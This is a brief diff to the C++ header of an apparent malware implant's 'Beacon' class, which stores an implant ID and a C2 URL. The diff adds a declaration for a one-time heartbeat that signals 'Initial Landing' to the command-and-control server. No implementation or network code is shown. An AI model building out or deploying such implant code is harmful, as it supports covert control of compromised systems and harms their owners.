@@ -19,6 +19,10 @@ public:
     Beacon();
     void run();
 
+    // Sends a one-time check-in to the C2 and returns immediately.
+    // Useful for initial landing notification.
+    void sendOneTimeHeartbeat(const std::string& statusMsg = "Initial Landing");
+
 private:
     std::string implantId_;
     std::string c2Url_;
